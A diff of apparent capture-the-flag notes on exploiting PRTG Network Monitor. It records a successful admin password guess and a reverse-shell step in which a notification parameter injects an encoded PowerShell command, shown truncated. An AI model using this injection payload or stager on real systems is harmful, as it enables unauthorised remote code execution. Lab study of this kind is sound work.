@@ -178,14 +178,14 @@ prtgadmin:PrTg@dmin2018
 prtgadmin:PrTg@dmin2019 -> successful
 
 
-
-## reverse shel
+## reverse shell
 
 https://thehackingtutorials.com/prtg-network-monitor-exploit-with-poc/
 
 create notification
 
 example.ps1 
+
 ```
 param: test.txt;powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAUwBpAE8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAFIAUwBpAE8AbgAuAE0AQQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAUwBzAEUATQBCAEwAeQAuAEcAZQB0AFQAWQ
 BQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBz
